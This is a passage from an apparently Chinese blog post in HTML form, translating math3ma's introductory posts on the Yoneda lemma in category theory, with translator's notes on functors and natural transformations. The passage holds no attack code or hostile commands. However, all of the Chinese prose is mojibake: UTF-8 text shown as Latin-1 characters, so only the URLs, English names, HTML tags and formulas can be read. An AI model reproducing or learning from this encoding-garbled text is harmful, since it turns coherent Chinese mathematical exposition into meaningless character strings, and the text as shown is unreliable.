xè¿™ä¸€æ­¥åªæ˜¯æŠŠxè£…èµ·æ¥å˜æˆå¯ä»¥è£…xç±»å‹çš„å®¹å™¨è€Œå·²ï¼ˆæˆ‘ä»¬å¹¶ä¸å…³å¿ƒè¿™ä¸ªFå¯¹xåšäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯â€œFå¯¹xçš„ç¡®åšäº†äº›ä»€ä¹ˆâ€è¿™ä¸ªäº‹å®æœ¬èº«â€”â€”æ‰€ä»¥æŠŠF xå½“ä½œä¸€ä¸ªå®¹å™¨å¥½äº†ï¼Œåªéœ€è¦æŠŠxæ”¾è¿›å»ç„¶åç›–ä¸Šç›–å­ï¼Œä¸å»ç†ç¬é‡Œé¢å‘ç”Ÿäº†ä»€ä¹ˆï¼‰ã€‚å‡è®¾å®¹å™¨ä¸€å¼€å§‹åªèƒ½è£…xç±»å‹ï¼Œä½†æ˜¯å¦‚æœå¯¹æ‰€æœ‰å¯èƒ½çš„ç±»å‹xï¼Œâ€œè£…å…¥tç±»å‹ä¸ºF tâ€è¿™äº‹éƒ½èƒ½é€šè¿‡handler: t-&gt;xè½¬åŒ–ä¸ºâ€œè£…å…¥xç±»å‹ä¸ºF xâ€ï¼Œé‚£ä¹ˆè¿™ä¸ªå®¹å™¨äº‹å®ä¸Šå°±æ˜¯å¯ä»¥è£…tç±»å‹çš„ã€‚</li>\n<li>è¯‘è€…çš„ç†è§£æ˜¯ï¼Œå¦‚æœä¸æŠŠ<code>F x</code>çœ‹ä½œå®¹å™¨ï¼Œè€Œæ˜¯çœ‹æˆç±»å‹æ„é€ å™¨ï¼Œé‚£ä¹ˆå¯ä»¥è¿™ä¹ˆè§£é‡Šï¼šåŸºäºtæ„é€ æ–°ç±»å‹çš„å®è´¨ï¼Œå°±æ˜¯éœ€è¦ä»æ¯ä¸ªtç±»å‹å€¼æ„é€ æ–°çš„F tç±»å‹å€¼ï¼ˆæ‰€ä»¥åœ¨è¿™ç§è§†è§’ä¸‹ï¼Œæ²¡æœ‰å…·ä½“çš„è½¬æ¢ç»†èŠ‚ï¼Œæˆ‘ä»¬åªçŸ¥é“æœ‰ä¸€ä¸ªæ–°ç±»å‹F tå¸¦æ¥æ–°çš„å…³ç³»ï¼Œè¿™äº›æ–°çš„å…³ç³»ä»æ—§å…³ç³»å¯¼å‡ºï¼‰ã€‚å¯¹ä»»æ„å¯èƒ½çš„ç±»å‹xï¼Œæ¯ä¸ªtç±»å‹å€¼éƒ½å¯¹åº”ä¸€ç§è‡ªå·±çš„<em>è½¬æ¢æ–¹å¼</em>ï¼Œä½¿å¾—å„ä¸ªhandler: t-&gt;xï¼ˆæŸç§æ„ä¹‰ä¸Šæ˜¯å…³ç³»ï¼‰åˆ†åˆ«è½¬åŒ–ä¸ºä¸€ä¸ªå€¼vï¼Œvçš„ç±»å‹æ˜¯åŸºäºxæ„é€ çš„æ–°ç±»å‹F xã€‚ <strong>æˆ–è€…è¯´ï¼Œæ¯ä¸ªç±»å‹xéƒ½å¯ä»¥è¦æ±‚ä¸€ä¸ªèƒ½æŠŠtå€¼è½¬åŒ–ä¸ºxå€¼çš„handlerï¼Œè€Œåç”¨æ„é€ å™¨Fæ„é€ æ–°ç±»å‹æ—¶ï¼Œå°±å¯ä»¥ä»handlerè¿™äº›æ—§æœ‰å…³ç³»å¯¼å‡ºæ–°ç±»å‹F tä¸å…¶ä»–æ–°ç±»å‹F xä¹‹é—´çš„æ–°å…³ç³»ï¼›å› ä¸ºè¿™äº›handleræŠŠç±»å‹tçš„è¿ç®—ç»†èŠ‚â€œåŒ…åŠâ€äº†ã€‚</strong> å¯¹äºä»»æ„ç±»å‹xï¼Œä»»æ„çš„handleréƒ½æœ‰è¿™ç§<em>è½¬æ¢æ–¹å¼</em>ï¼ˆå…±åŒæ„æˆæ¯ä¸ªxçš„è‡ªç„¶å˜æ¢ï¼‰ã€‚å› æ­¤ï¼Œåº”ç”¨ç±»å‹æ„é€ å™¨Fæ—¶ï¼Œç±»å‹tçš„æ¯ä¸ªå€¼éƒ½ä¼šæŒ‡å¯¼å½¢å¦‚(t-&gt;â€¦)çš„handlerè¯¥å¦‚ä½•è½¬æ¢ä¸º(F t-&gt;Fâ€¦)ï¼Œè€Œè¿™äº›è‡ªç„¶å˜æ¢æ„æˆäº†tç±»å‹å­˜åœ¨çš„å…¨éƒ¨æ„ä¹‰ã€‚æ‰€æœ‰å’Œtæœ‰å…³çš„è¿ç®—éƒ½å¯ä»¥è§†ä¸ºä¸€ç§ç±»å‹æ„é€ ï¼Œå› æ­¤ç±»å‹tçš„æ„ä¹‰åªæœ‰åœ¨è¿ç®—ä¸­æ‰ä¼šå¾—åˆ°æ˜¾ç°ï¼Œä¸€ä¸ªä¸å‚ä¸è¿ç®—ï¼ˆä¸æ„é€ æ–°ç±»å‹ï¼‰çš„ç±»å‹æ²¡æœ‰ä»»ä½•å­˜åœ¨ä»·å€¼ï¼Œè¿™ç¬¦åˆç›´è§‰ã€‚</li>\n</ul>\n</li>\n<li><p>åˆ†åˆ«å–å®šFå’ŒAï¼Œä¼šå‘ç°Yonedaå¼•ç†è¿™ä¸ªåŒæ„å…³ç³»å¯¹äºFã€téƒ½æ˜¯è‡ªç„¶åŒæ„ï¼ˆå‚è§<a href=\"https://www.bilibili.com/video/BV1AN4y1V7mH\">ã€èŒƒç•´è®ºã€‘ç¬¬5è®²ï¼ŒYonedaå¼•ç†</a>ï¼‰</p>\n</li>\n</ul>\n<p>æ¯æ—¥æ›´æ–°ï¼</p>\n<h2 id=\"1-3ï¼šç±³ç”°è§†è§’-The-Yoneda-Perspective\"><a href=\"#1-3ï¼šç±³ç”°è§†è§’-The-Yoneda-Perspective\" class=\"headerlink\" title=\"1&#x2F;3ï¼šç±³ç”°è§†è§’(The Yoneda Perspective)\"></a><a name=\"1\"></a>1&#x2F;3ï¼šç±³ç”°è§†è§’(The Yoneda Perspective)</h2><p><em>æœ¬éƒ¨åˆ†ç¿»è¯‘è‡ª <a href=\"https://www.math3ma.com/blog/the-yoneda-perspective\">https://www.math3ma.com/blog/the-yoneda-perspective</a></em></p>\n<p><a href=\"http://blog.sigfpe.com/2006/11/yoneda-lemma.html?m=1\">Dan Piponi</a> è¯´è¿™æ˜¯â€œæ•°å­¦ä¸­æœ€éš¾çš„ trivial ç©æ„â€ï¼›<a href=\"https://ncatlab.org/nlab/show/Yoneda+lemma\">nLab</a> å¯¹å®ƒçš„çœ‹æ³•æ˜¯â€œåˆç­‰çš„ï¼Œæ·±åˆ»çš„ï¼Œæ ¸å¿ƒçš„â€ï¼›è€Œ <a href=\"http://www.math.jhu.edu/~eriehl/context.pdf\">Emily Riehl</a> åˆ™å°†å…¶æåä¸ºâ€œå¯ä»¥è¯´æ˜¯èŒƒç•´è®ºä¸­æœ€é‡è¦çš„ç»“æœâ€ã€‚ç„¶è€Œï¼Œæ­£å¦‚ <a href=\"http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps\">Tom Leinster</a> æ‰€æŒ‡å‡ºçš„ï¼Œâ€œè®¸å¤šäººè§‰å¾—å®ƒéå¸¸ä»¤äººå›°æƒ‘ã€‚â€<br>ä»–ä»¬è°ˆè®ºçš„æ˜¯ä»€ä¹ˆï¼Ÿ<br><strong>æ­£æ˜¯ç±³ç”°å¼•ç†(Yoneda lemma)ã€‚</strong></p>\n<p><img src=\"/yoneda/yoneda.jpg\" loading=\"lazy\"></p>\n<p>â€œä½†â€¦â€¦â€ä½ é—®é“ï¼Œâ€œç±³ç”°å¼•ç†æ˜¯å•¥ï¼Ÿå¦‚æœå®ƒè¿˜åªæ˜¯ä¸€ä¸ªå¼•ç†ï¼Œé‚£ä¹ˆâ€¦â€¦å¤©å“ªâ€¦â€¦å®šç†æ˜¯ä»€ä¹ˆï¼Ÿâ€</p>\n<p>åœ¨å›ç­”é—®é¢˜ä¹‹å‰ï¼Œæˆ‘æƒ³é€šè¿‡â€œæ‚ é—²åœ°æ¼«æ­¥â€(leisurely stroll)äºå…¶ä¸­çš„ä¸¤ä¸ªæ¨è®ºæ¥è¯±å¯¼å‡ºè¿™ä¸ªç»“æœã€‚å®é™…ä¸Šï¼Œè¯è¯´åœ¨å‰å¤´ï¼Œæˆ‘æ²¡æœ‰åœ¨èŒƒç•´å­¦é¢†åŸŸçš„ä»»ä½•éƒ¨åˆ†â€œæ¼«æ­¥â€çš„èµ„è´¨ï¼ˆè¯‘è€…æ³¨ï¼šä½œè€…çš„è‡ªè°¦ï¼‰ã€‚çš„ç¡®ï¼Œæœ‰èµ„æ ¼ä¸ºæˆ‘ä»¬å±•ç¤º Yoneda å¼•ç†ï¼ˆè¯‘è€…æ³¨ï¼šåæ–‡æˆ‘ä»¬å‡å¦‚æ­¤ç§°å‘¼ï¼Œå› ä¸ºæ›´å¸¸ç”¨ï¼‰è¿™é¢—é—ªé—ªå‘å…‰çš„ç²¾åˆ‡é’»çŸ³çš„ï¼ŒæŒ‰ç†è¯´æ˜¯èŒƒç•´å­¦å®¶ä»¬ï¼Œè€Œæˆ‘ä¸æ˜¯èŒƒç•´å­¦å®¶ï¼ˆè¯‘è€…æ³¨ï¼šä¾ç„¶æ˜¯ä½œè€…çš„è‡ªè°¦ï¼‰ã€‚ä¸è¿‡ï¼Œæˆ‘å°±æ˜¯å–œæ¬¢è·Ÿä½ è®²è¿°ä¸€äº›æˆ‘æ‰€å–œæ¬¢çš„äº‹ç‰©ï¼Œè€ŒYonedaå¼•ç†æ­£æ˜¯æˆ‘å–œæ¬¢çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿˜æ˜¯äºæ­¤å¤„ç›¸é‡äº†ï¼</p>\n<p>ç°åœ¨æˆ‘å¯ä»¥é€‰æ‹©ç®€å•åœ°å‘Šè¯‰ä½ æ¨è®ºåœ¨æˆ‘çœ¼é‡Œçš„æ ·å­ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ç®€å•åœ°æŠŠå¼•ç†ç”©ç»™ä½ ã€‚ä½†æ­£å¦‚ <a href=\"http://www.math.csi.cuny.edu/~maher/\">Joseph Maher</a> æ›¾ç»è¯´è¿‡çš„é‚£æ ·ï¼š</p>\n<blockquote>\n<p>æ•°å­¦æ˜¯å–œå‰§çš„åé¢ï¼Œæ˜¯åç¬‘è¯(anti-joke)*ã€‚æˆ‘ä»¬å…ˆå‘Šè¯‰ä½ ç¬‘ç‚¹ï¼Œç„¶åè´¹åŠ›åœ°å‘ä½ è§£é‡Šä¸ºä»€ä¹ˆè¿™ä¸ªç¬‘ç‚¹æ˜¯å¯¹çš„ã€‚</p>\n</blockquote>\n<p>æ‰€ä»¥ï¼Œé¦–å…ˆæˆ‘è¦å‘Šè¯‰ä½ ä»¬ä¸€ä¸ªç¬‘ç‚¹â€”â€”å…³äº Yoneda å¼•ç†ä¸¤ä¸ªæ¨è®ºçš„æ€»ç»“ã€‚<a href=\"http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property\">æˆ‘ä¹‹å‰åœ¨è¿™ä¸ªåšå®¢ä¸Šæåˆ°è¿‡å®ƒ</a>ï¼Œä½†æˆ‘åœ¨è¿™ä¸ªç³»åˆ—ä¸­çš„ç›®æ ‡æ˜¯å°†å®ƒé”šå®šåœ¨ä¸€ä¸ªæ›´æ­£è§„ä¸¥è°¨çš„æ•°å­¦åŸºç¡€ä¸Šâ€”â€”ä¹Ÿå°±æ˜¯åœ¨è´¹åŠ›åœ°è§£é‡Šä¸ºä»€ä¹ˆå®ƒæ˜¯æ­£ç¡®çš„ç¬‘ç‚¹ã€‚å®ƒæ˜¯è¿™æ ·ä¸€ä¸ªæ¦‚å¿µï¼š</p>\n<blockquote>\n<p>æ•°å­¦å¯¹è±¡å®Œå…¨ç”±å®ƒä»¬ä¸å…¶ä»–å¯¹è±¡çš„å…³ç³»æ‰€å†³å®šã€‚</p>\n</blockquote>\n<p>è®©æˆ‘ä»¬ç§°å…¶ä¸º<em>Yonedaè§†è§’</em>ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒè¡¨æ˜ï¼Œå¦‚æœä½ æƒ³ç†è§£å¯¹è±¡ï¼ˆé›†åˆã€ç¾¤ã€æ‹“æ‰‘ç©ºé—´ç­‰ç­‰ï¼‰ï¼Œé‚£ä¹ˆç”¨<a href=\"http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf\">Barry Mazur</a>çš„è¯æ¥è¯´ï¼Œä½ ä¼šæƒ³è¦ç†è§£â€œå®ƒä»¬ä¸åŒç±»çš„ã€æ‰€æœ‰å…¶ä»–å¯¹è±¡ä¹‹é—´çš„å…³ç³»ç½‘â€ã€‚æˆ‘ä»¬å·²ç»åœ¨å‡ ç¯‡å¸–å­ä¸­æ¢è®¨äº†è¯¥ç†å¿µâ€”â€”<a href=\"http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics\">The Most Obvious Secret in Mathematics</a>å’Œ<a href=\"http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property\">The Sierpinski Space and its Special Property</a>â€”â€”æ‰€ä»¥æˆ‘å°±ä¸åœ¨è¿™è¯¦ç»†å±•å¼€äº†ã€‚ï¼ˆå¦‚æœä½ è¿˜æ²¡çœ‹è¿‡ï¼Œè¯·åŠ¡å¿…å»çœ‹ä¸€çœ‹ï¼ä½ å¯ä»¥è®¤ä¸ºè¿™äº›å¸–å­æ˜¯æœ¬æ–‡çš„å‰ä¼ ã€‚ï¼‰ä½†æ˜¯æˆ‘æƒ³æä¸€å˜´ï¼ŒYoneda è§†è§’å¯å‘äº†ä¸€ç§è§‚ç‚¹ï¼Œä¸€äº›æ•°å­¦å®¶â€”â€”è¿˜æœ‰è¿™ä¸ªåšå®¢**ä¹Ÿè¶Šæ¥è¶Šå¤šåœ°é‡‡çº³äº†è¿™ç§è§‚ç‚¹ï¼Œä¹Ÿå³</p>\n<blockquote>\n<p>æ•°å­¦å¯¹è±¡çš„æ€§è´¨æ¯”å®ƒçš„å®šä¹‰æ›´é‡è¦ã€‚</p>\n</blockquote>\n<p>ä¸ºä»€ä¹ˆè¦é‡‡ç”¨è¿™ç§è§‚ç‚¹ï¼Ÿå› ä¸ºè„±å£è€Œå‡ºèƒŒè¯µå®šä¹‰å¾ˆå®¹æ˜“ï¼šç¬›å¡å°”ä¹˜ç§¯æ˜¯â€¦ï¼Œé›†åˆç”Ÿæˆçš„è‡ªç”±ç¾¤æ˜¯â€¦ï¼Œå•†æ‹“æ‰‘æ˜¯â€¦ä½†å®šä¹‰å¹¶ä¸æ€»æ˜¯èƒ½è¯´æ˜ä¸€åˆ‡ã€‚ç§¯æ˜¯å¤©ç„¶å¸¦æœ‰<em>ç›®æ ‡ä¸ºå®ƒ</em>æˆ–<em>ä»å®ƒå‡ºå‘</em>çš„æ˜ å°„çš„å—ï¼Ÿå¦‚æœä¸€ä¸ªè‡ªç”±ç¾¤çš„ç”Ÿæˆé›†ä½äºå¦ä¸€ä¸ªç¾¤å†…ï¼Œè¿™ä¸¤ä¸ªç¾¤åœ¨æŸç§ç¨‹åº¦ä¸Šå­˜åœ¨è”ç³»å—ï¼Ÿå•†ç©ºé—´ä¸Šçš„è¿ç»­å‡½æ•°æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Ÿè¿™äº›é—®é¢˜éƒ½ç ”ç©¶å¯¹è±¡çš„å±æ€§â€”â€”è€Œæ­£æ˜¯å±æ€§å®šä¹‰äº†å¯¹è±¡çš„ç‰¹å¾ã€‚ä¸€æ—¦æˆ‘ä»¬æ‹“å®½è§†è§’ï¼Œä»å¯¹è±¡æ‰€å­˜åœ¨çš„èŒƒç•´è¿™ä¸€è§†è§’æ£€è§†å¯¹è±¡ï¼Œç­”æ¡ˆå°±ä¼šæ°´è½çŸ³å‡ºã€‚</p>\n<p>æˆ‘æƒ³è¡¨è¾¾çš„å«ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>\n<p>å‡è®¾ä½ æƒ³æ¢ç´¢å¯¹è±¡ X çš„æ€§è´¨ã€‚ç°åœ¨æƒ³è±¡ä¸€ä¸‹ï¼ŒæŠŠè‡ªå·±å¸¦å…¥å¦ä¸€ä¸ªå¯¹è±¡ Y çš„è§†è§’ã€‚ç„¶åé—®ï¼šâ€œä» Y çš„è§†ç‚¹(vantage point)çœ‹èµ·æ¥ï¼ŒX æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿâ€ ç„¶åç°åœ¨èµ°åˆ°å¦ä¸€ä¸ªå¯¹è±¡ Z æ—ï¼ŒåŒæ ·è®¾èº«èº«å¤„åœ°é—®ï¼šâ€œç°åœ¨å‘¢ï¼Ÿä» Z è¿™é‡Œçœ‹ï¼ŒX æ˜¯ä»€ä¹ˆæ ·ï¼Ÿâ€ä¸€ç›´è¿™ä¹ˆåšä¸‹å»ï¼Œç›´åˆ°ä½ ç«™åœ¨èŒƒç•´ä¸­æ¯ä¸ªå¯¹è±¡çš„è§’åº¦éƒ½å‰–æäº† X ä¸€éã€‚æœ€åï¼Œä½ å°±ä¼šæ”¶é›†åˆ°å¤§é‡å…³äº X çš„ä¿¡æ¯ã€‚</p>\n<p>å°±åƒ<a href=\"https://www.youtube.com/watch?v=vwF7AHTQaoc\">è¿™ä¸ªç‰‡æ®µ</a>ã€‚ä»ä¸€ä¾§çœ‹ï¼Œç‰‡æ®µé‡Œçš„è¿™åº§é›•å¡‘åƒä¸€å¤´å¤§è±¡ï¼›ä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ƒåˆçœ‹èµ·æ¥åƒä¸¤åªé•¿é¢ˆé¹¿ã€‚ä½†è¿™ä¸¤ä¸ªè§’åº¦éƒ½æ²¡æœ‰ç»™å‡ºå¯¹é›•å¡‘å®Œæ•´çš„æè¿°ã€‚ä¸ºäº†çœŸæ­£ç†è§£è¿™åº§é›•å¡‘ï¼Œæˆ‘ä»¬åº”è¯¥ä»æ‰€æœ‰å¯èƒ½çš„è§†ç‚¹æ¥è§‚çœ‹å®ƒã€‚èŒƒç•´ç†è®ºä¹Ÿæœ‰åŒæ ·çš„è§‚ç‚¹ï¼šæ›´å¤šçš„è§†ç‚¹æä¾›äº†æ›´å¤šçš„ä¿¡æ¯ã€‚æ³¨æ„ï¼Œåˆ’é‡ç‚¹ï¼šYoneda å¼•ç†è¯´æ˜</p>\n<blockquote>\n<p><strong>æ‰€æœ‰</strong>çš„è§†ç‚¹ä¼šç»™å‡º<strong>æ‰€æœ‰</strong>çš„ä¿¡æ¯ã€‚</p>\n</blockquote>\n<p>è¿™å°±æ˜¯ä¸Šæ–‡æ‰€è¿° Yonedaè§†è§’ çš„æœ¬è´¨ï¼Œä¹Ÿæ˜¯æ€ç»´æ¸…æ™°çš„æ•°å­¦å®¶å¦‚æ­¤é‡è§†æ€å°„ã€äº¤æ¢å›¾ã€æ™®éæ€§è´¨ç­‰çš„åŸå› ä¹‹ä¸€ï¼ˆä¸çŸ¥é“ä½ æ³¨æ„åˆ°äº†å—ï¼Ÿï¼‰ã€‚è¿™äº›éƒ½æ˜¯å…³äºå…³ç³»çš„ï¼å½“ç„¶ï¼Œè¿™åªæ˜¯ä¸€ç§ç›´è§‰ã€‚å®é™…æ•°å­¦å½¢å¼æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿé‚£ä¸¤ä¸ªæ¨è®ºæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘æ‰€è¯´çš„â€œâ€¦ç‰©ä½“å®Œå…¨è¢«â€¦å†³å®šâ€ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿä»€ä¹ˆæ˜¯â€œä¸¤ä¸ªç‰©ä½“ä¹‹é—´çš„å…³ç³»â€ï¼Ÿæˆ‘ä»¬å¦‚ä½•çœ‹å¾…â€œèŒƒç•´ä¸­<em>æ‰€æœ‰å¯¹è±¡çš„è§†ç‚¹</em>â€ï¼ŸYoneda å¼•ç†<em>å…·ä½“</em>æ˜¯å¦‚ä½•æ•æ‰åˆ°è¿™ä¸€ç‚¹çš„ï¼Ÿ</p>\n<p>è¿™äº›æ˜¯æˆ‘ä»¬<a href=\"#2\">ä¸‹å‘¨</a>è¦å›ç­”çš„é—®é¢˜ã€‚<br>é¡ºå¸¦ä¸€æï¼Œæƒ³å¤ä¹ ä¸€ä¸‹èŒƒç•´è®ºå—ï¼Ÿå¯ä»¥ä»è¿™å‡ ä¸ªåœ°æ–¹å¼€å§‹ï¼š<br><a href=\"http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway\">What is Category Theory, Anyway?</a><br><a href=\"http://www.math3ma.com/mathema/2017/1/23/what-is-a-category\">Whatâ€™s a Category?</a><br><a href=\"http://www.math3ma.com/mathema/2017/1/31/what-is-a-functor-part-1\">Whatâ€™s a Functor?</a><br><a href=\"http://www.math3ma.com/mathema/2017/2/6/what-is-a-natural-transformation\">Whatâ€™s a Natural Transformation?</a></p>\n<hr>\n<p>*: æ‰€ä»¥æ•°å­¦å®¶æ˜¯ cocomedian? (é‚£<a href=\"https://www.instagram.com/p/BLwhFLFgTbE/?taken-by=math3ma\">comathematician</a>æ˜¯ä»€ä¹ˆ?)ï¼ˆè¯‘è€…æ³¨ï¼šco-è¿™ä¸€è¯æ ¹å‰ç¼€åœ¨èŒƒç•´è®ºä¸­è¢«å¤§é‡åº”ç”¨ï¼Œç”¨æ¥è¡¨è¾¾â€œå¯¹å¶çš„â€â€œåæ–¹å‘çš„â€ç­‰æ„å‘³ã€‚å“‡ï¼Œè¿™å²‚ä¸æ˜¯å¯ä»¥è¯´æ˜ coconut å…¶å®å°±æ˜¯ nutï¼Ÿï¼‰<br>**: å‚è§ <a href=\"http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway\">Exhibit A</a> å’Œ <a href=\"http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics\">Exhibit B</a> å’Œ <a href=\"http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property\">Exhibit C</a> å’Œ <a href=\"https://twitter.com/math3ma/status/894700378792611840\">Exhibit D</a> å’Œ <a href=\"http://www.math3ma.com/mathema/2017/2/22/crumbs\">Exhibit E</a>, ä½œä¸ºä¾‹è¯</p>\n<h2 id=\"2-3ï¼šç±³ç”°åµŒå…¥-The-Yoneda-Embedding\"><a href=\"#2-3ï¼šç±³ç”°åµŒå…¥-The-Yoneda-Embedding\" class=\"headerlink\" title=\"2&#x2F;3ï¼šç±³ç”°åµŒå…¥(The Yoneda Embedding)\"></a>2&#x2F;3ï¼š<a name=\"2\"></a>ç±³ç”°åµŒå…¥(The Yoneda Embedding)</h2><p><em>æœ¬éƒ¨åˆ†ç¿»è¯‘è‡ª <a href=\"https://www.math3ma.com/blog/the-yoneda-embedding\">https://www.math3ma.com/blog/the-yoneda-embedding</a></em></p>\n<p><a href=\"#1\">ä¸Šå‘¨</a>æˆ‘ä»¬å¼€å§‹æ¢è®¨Yonedaå¼•ç†ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰ç›´æ¥é™ˆè¿°Yonedaå¼•ç†æœ¬èº«ï¼ˆå› ä¸ºç¼ºä¹åŠ¨æœºï¼‰ï¼Œè€Œæ˜¯â€œæ‚ é—²åœ°æ¼«æ­¥â€äºå…¶æ¨è®ºä¹‹ä¸€â€”â€”â€”Yonedaè§†è§’ï¼Œä¹Ÿå°±æ˜¯ï¼š</p>\n<blockquote>\n<p>ä¸€ä¸ªå¯¹è±¡å®Œå…¨ç”±å…¶ä¸å…¶ä»–å¯¹è±¡çš„â€œå…³ç³»â€ç¡®å®šï¼Œ</p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯ï¼š</p>\n<blockquote>\n<p>ä»èŒƒç•´ä¸­çš„æ¯ä¸ªå¯¹è±¡çš„è§†è§’çœ‹ï¼Œå¯¹è±¡æ˜¯ä»€ä¹ˆâ€œæ ·å­â€ã€‚</p>\n</blockquote>\n<p>ä½†è¿™è®©æˆ‘ä»¬ä¸ç¦æƒ³é—®ï¼Œâ€œå®é™…æ•°å­¦å½¢å¼æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿé‚£ä¸¤ä¸ªæ¨è®ºæ˜¯ä»€ä¹ˆæ¨è®ºï¼Ÿâ€åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¼šå°½é‡æ‰¾å‡ºç­”æ¡ˆã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°†è¿™ä¸‰ä¸ªæŠ½è±¡å™è¿°èƒŒåçš„å…·ä½“æ•°å­¦æ¦‚å¿µå…·ä½“åŒ–ï¼š</p>\n<ul>\n<li>â€œâ€¦ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„<em>å…³ç³»</em>â€¦â€</li>\n<li>â€œâ€¦èŒƒç•´ä¸­<em>æ¯ä¸ªå¯¹è±¡çš„è§†ç‚¹</em>â€¦â€</li>\n<li>â€œâ€¦ä¸€ä¸ªå¯¹è±¡<em>å®Œå…¨</em>ç”±â€¦<em>è¡¨å¾(characterized)</em>â€¦â€</li>\n</ul>\n<p>æˆ‘ä»¬å°†é€ä¸€è§£å¯†è¿™äº›å™è¿°æ–¹å¼ã€‚æ¥ä¸‹æ¥ï¼Œè®¾ Set è¡¨ç¤ºé›†åˆèŒƒç•´ï¼ŒC ä¸ºä»»æ„èŒƒç•´ã€‚</p>\n<hr>\n<blockquote>\n<p>â€œä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„å…³ç³»â€æ˜¯æŒ‡ä¸€ä¸ªæ€å°„(morphism)ã€‚</p>\n</blockquote>\n<p>å‡å¦‚åœ¨ C ä¸­ï¼Œä¸¤ä¸ªå¯¹è±¡ X å’Œ Y å®ƒä»¬ä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ€å°„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´ä»–ä»¬â€œå­˜åœ¨å…³ç³»â€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœXæ˜¯ä¸€ä¸ªå…·æœ‰<a href=\"http://www.math3ma.com/the-back-pocket/2016/8/26/comparing-topologies\">ç¦»æ•£æ‹“æ‰‘</a>çš„æ‹“æ‰‘ç©ºé—´ï¼Œé‚£ä¹ˆä» X åˆ° Y å°±æœ‰å¾ˆå¤šå…³ç³»â€”â€”ä¹Ÿå°±æ˜¯æœ‰å¾ˆå¤šä» X åˆ° Y çš„è¿ç»­å‡½æ•°â€”â€”å¯¹äºä»»ä½•ç©ºé—´Yã€‚äº‹å®ä¸Šï¼Œä»ä¸€ä¸ªç¦»æ•£ç©ºé—´å‡ºå‘çš„<em>æ‰€æœ‰</em>æ˜ å°„éƒ½æ˜¯è¿ç»­çš„ã€‚</p>\n<p><img src=\"/yoneda/discrete.jpg\" loading=\"lazy\"></p>\n<p>è€Œåè§‚åŸŸèŒƒç•´ï¼Œå…¶ä¸­çš„å¯¹è±¡ä¹‹é—´çš„å…³ç³»å°±éå¸¸å°‘äº†â€”â€”å› ä¸ºåœ¨å…·æœ‰ä¸åŒç‰¹å¾(characteristics)çš„åŸŸä¹‹é—´ä¸å­˜åœ¨åŸŸåŒæ€ï¼</p>\n<hr>\n<blockquote>\n<p>â€œâ€¦èŒƒç•´ä¸­<em>æ¯ä¸ªå¯¹è±¡çš„è§†ç‚¹</em>â€¦â€ ç¼–ç åœ¨ä¸€ä¸ªå‡½å­(functor)ä¸­</p>\n</blockquote>\n<p>è¦â€œä» C ä¸­æ‰€æœ‰å¯¹è±¡çš„è§†ç‚¹â€åˆ†æä¸€ä¸ªå¯¹è±¡ X ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ–¹æ³•æ¥è·Ÿè¸ª X ä¸ C ä¸­æ‰€æœ‰å¯¹è±¡çš„å…³ç³»ç½‘ã€‚è¿™ä¸ªâ€œå…³ç³»ç½‘â€æŒ‡çš„å°±æ˜¯æ‰€æœ‰<em>ä»Zåˆ°X</em>å’Œ<em>ä»Xåˆ°Z</em>çš„æ€å°„é›†åˆï¼Œä¹Ÿå°±æ˜¯è¿™äº›é›†åˆï¼š<br>$$\\text{hom}(Z,X)\\ ä¸\\ \\text{hom}(X,Z)\\ \\text{,å¯¹äºèŒƒç•´}\\mathbf{C}\\text{ä¸­çš„ä»»æ„å¯¹è±¡}Z\\text{.}$$<br>æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬å¸Œæœ›Cä¸­çš„<em>æ¯ä¸ª</em>Zéƒ½å¯¹åº”ä¸€ä¸ªä¸åŒçš„é›†åˆã€‚ä¸€ä¸ªå¯è¡Œçš„åŠæ³•æ˜¯é€šè¿‡<a href=\"https://www.math3ma.com/blog/what-is-a-functor-part-2\">åå˜å‡½å­(contravariant functor)</a> $\\text{hom}(-,X): \\mathbf{C}^{op}\\rightarrow \\mathbf{Set}$ï¼Œå®ƒå°†Zå‘é€åˆ°é›†åˆ$\\text{hom}(Z,X)$ï¼Œå¹¶å°†æ€å°„$f:Z\\rightarrow W$å‘é€åˆ°å…¶<a href=\"https://www.math3ma.com/blog/the-sierpinski-space-and-its-special-property\">æ‹‰å›(pullback)</a> $f^*$ï¼Œ$f^*$åˆ™å®šä¹‰ä¸ºâ€œä¸få‰å¤åˆ(precomposing)â€è¿™ä¸€æ“ä½œï¼ˆè¯‘è€…æ³¨ï¼šå‰å¤åˆã€åå¤åˆçš„è§£é‡Šå‚è§<a href=\"https://math.stackexchange.com/questions/3889401/what-are-post-composition-and-pre-composition-in-category-theory\">What are post-composition and pre-composition in category 